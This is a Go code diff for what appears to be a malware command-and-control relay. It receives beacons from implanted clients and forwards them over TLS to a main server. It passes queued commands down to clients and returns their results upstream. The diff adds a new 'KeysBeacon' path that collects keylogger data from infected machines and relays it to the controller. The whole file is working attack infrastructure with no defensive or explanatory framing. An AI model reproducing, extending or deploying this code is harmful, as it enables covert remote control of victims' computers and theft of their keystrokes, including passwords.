@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+    "slices"
 	"strings"
 	"sync"
 	"time"
@@ -26,7 +27,8 @@ var (
 )
 
 // Map to buffer data by UUID for each client
-var buffer sync.Map
+var commandBuffer sync.Map
+var keysBuffer sync.Map
 
 func main() {
 	enableLogging := true
@@ -69,6 +71,8 @@ func main() {
 }
 
 func handleClientConnection(clientConn net.Conn) {
+    defer clientConn.Close()
+
     for {
         mainConn, err := connectToMainServer()
         if err != nil {
@@ -76,12 +80,11 @@ func handleClientConnection(clientConn net.Conn) {
             time.Sleep(5 * time.Second)
             continue
         }
-        defer clientConn.Close()
         defer mainConn.Close()
+
         clientAddr := clientConn.RemoteAddr().String()
         logger.Logf(logger.Info, "Accepted connection from %s\n", clientAddr)
 
-        // Read data from client
         data := make([]byte, 4096)
         n, err := clientConn.Read(data)
         if err != nil {
@@ -90,9 +93,8 @@ func handleClientConnection(clientConn net.Conn) {
         }
         clientData := string(data[:n])
 
-        // Parse UUID directly from clientData
-        messageParts := strings.SplitN(clientData, ":", 3)
-        if len(messageParts) < 3 {
+        messageParts := strings.Split(clientData, ":")
+        if len(messageParts) != 11 {
             logger.Logf(logger.Warning, "Invalid data format from client %s", clientAddr)
             return
         }
@@ -102,43 +104,80 @@ func handleClientConnection(clientConn net.Conn) {
             logger.Logf(logger.Warning, "No UUID provided in client data from %s", clientAddr)
             return
         }
-        buffer.Store(clientUUID, clientData)
 
-        // Forward raw string data to main server
-        err = forwardToMainServer(clientUUID, clientData, mainConn)
-        if err != nil {
-            logger.Logf(logger.Warning, "Failed to forward to main server for client %s: %v\n", clientUUID, err)
+        validBeaconTypes := []string{"NoKeysBeacon", "KeysBeacon"}
+        beaconType := messageParts[5]
+        if !slices.Contains(validBeaconTypes, beaconType) {
+            logger.Logf(logger.Warning, "Invalid Beacon Type: %v from %s", beaconType, clientAddr)
             return
         }
 
-        // Retrieve response data from buffer
-        response, ok := buffer.Load(clientUUID)
-        if !ok {
-            logger.Logf(logger.Info, "No data available, sending empty response")
-            gob.NewEncoder(clientConn).Encode([]byte{}) // Send empty response
-        } else {
-            logger.Logf(logger.Info, "Sending data to client: %v", response)
-            gob.NewEncoder(clientConn).Encode(response)
-            buffer.Delete(clientUUID) // Clear buffer after successful send
-        }
+        switch beaconType {
+        case "NoKeysBeacon":
+            
 
-        // Decode the result from the client
-        result := types.GiveServerResult{}
-        dec := gob.NewDecoder(clientConn)
-        if err := dec.Decode(&result); err != nil {
-            logger.Logf(logger.Warning, "Failed to decode GiveServerResult from client %s: %v\n", clientAddr, err)
+            err = forwardNoKeysBeacon(clientUUID, clientData, mainConn)
+            if err != nil {
+                logger.Logf(logger.Warning, "Failed to forward to main server for client %s: %v\n", clientUUID, err)
+                return
+            }
+
+            response, ok := commandBuffer.Load(clientUUID)
+            if !ok {
+                logger.Logf(logger.Info, "No data available, sending empty response")
+                gob.NewEncoder(clientConn).Encode([]byte{})
+            } else {
+                logger.Logf(logger.Info, "Sending data to client: %v", response)
+                gob.NewEncoder(clientConn).Encode(response)
+                commandBuffer.Delete(clientUUID)
+            }
+
+            result := types.GiveServerResult{}
+            dec := gob.NewDecoder(clientConn)
+            if err := dec.Decode(&result); err != nil {
+                logger.Logf(logger.Warning, "Failed to decode GiveServerResult from client %s: %v\n", clientAddr, err)
+                return
+            }
+            logger.Logf(logger.Info, "Received GiveServerResult from client %s: %v\n", clientAddr, result)
+    
+            processCommandResult(clientUUID, result, mainConn)
+            return
+        case "KeysBeacon":
+            keysBuffer.Store(clientUUID, clientData)
+            err := forwardKeysBeacon(clientUUID, clientData, mainConn)
+            if err != nil {
+                logger.Logf(logger.Warning, "Failed to forward to main server for client %s: %v\n", clientUUID, err)
+                return
+            }
+            response, ok := keysBuffer.Load(clientUUID)
+            if !ok {
+                logger.Logf(logger.Info, "No data available, sending empty response")
+                gob.NewEncoder(clientConn).Encode([]byte{})
+            } else {
+                logger.Logf(logger.Info, "Sending data to client: %v", response)
+                gob.NewEncoder(clientConn).Encode(response)
+                keysBuffer.Delete(clientUUID)
+            }
+
+            result := types.KeyReceive{}
+            dec := gob.NewDecoder(clientConn)
+            if err := dec.Decode(&result); err != nil {
+                logger.Logf(logger.Warning, "Failed to decode KeyReceive from client %s: %v\n", clientAddr, err)
+                return
+            }
+            logger.Logf(logger.Info, "Received KeyReceive from client %s: %v\n", clientAddr, result)
+            processKeylogs(clientUUID, result, mainConn)
+            return
+        default:
+            logger.Logf(logger.Info, "Unknown beacon type %v", beaconType)
             return
         }
-        logger.Logf(logger.Info, "Received GiveServerResult from client %s: %v\n", clientAddr, result)
-        
-        // Handle the result as needed
-        processCommandResult(clientUUID, result, mainConn)
-        break
     }
 }
 
-// forwardToMainServer forwards client data to the main server and buffers the server's response
-func forwardToMainServer(clientUUID string, clientData string, mainConn *tls.Conn) error {
+
+// forwardNoKeysBeacon forwards client data to the main server and buffers the server's response
+func forwardNoKeysBeacon(clientUUID string, clientData string, mainConn *tls.Conn) error {
 
     // Send raw client data as a string to the main server
     _, err := mainConn.Write([]byte(clientData))
@@ -156,12 +195,48 @@ func forwardToMainServer(clientUUID string, clientData string, mainConn *tls.Con
     }
 
     logger.Logf(logger.Info, "Received server response: %v", serverResponse)
-    buffer.Store(clientUUID, serverResponse)
+    commandBuffer.Store(clientUUID, serverResponse)
+    return nil
+}
+
+// forwardKeysBeacon forwards client data to the main server returns the server's response
+func forwardKeysBeacon(clientUUID string, clientData string, mainConn *tls.Conn) (error) {
+
+    // Send raw client data as a string to the main server
+    _, err := mainConn.Write([]byte(clientData))
+    if err != nil {
+        logger.Logf(logger.Warning, "Failed to send data to main server: %v\n", err)
+        return err
+    }
+
+    // Decode the server's response into a byte array or a string if expected
+    dec := gob.NewDecoder(mainConn)
+    var serverResponse types.KeySend
+    if err := dec.Decode(&serverResponse); err != nil {
+        logger.Logf(logger.Warning, "Failed to decode response from main server: %v\n", err)
+        return err
+    }
+
+    logger.Logf(logger.Info, "Received server response: %v", serverResponse)
+    keysBuffer.Store(clientUUID, serverResponse)
     return nil
 }
 
 // processCommandResult processes and forwards the command result to the main server
 func processCommandResult(clientUUID string, result types.GiveServerResult, mainConn *tls.Conn) {
+    logger.Logf(logger.Debug, "Sending command response: %v", result)
+
+    // Use gob Encoder to send result directly over the connection
+    encoder := gob.NewEncoder(mainConn)
+    err := encoder.Encode(result)
+    if err != nil {
+        logger.Logf(logger.Error, "Error sending response: %v", err)
+    }
+    logger.Logf(logger.Debug, "Sent encoded response")
+}
+
+// processKeylogs processes and forwards the command result to the main server
+func processKeylogs(clientUUID string, result types.KeyReceive, mainConn *tls.Conn) {
     logger.Logf(logger.Debug, "Sending command response: %v", result)
 
     // Use gob Encoder to send result directly over the connection
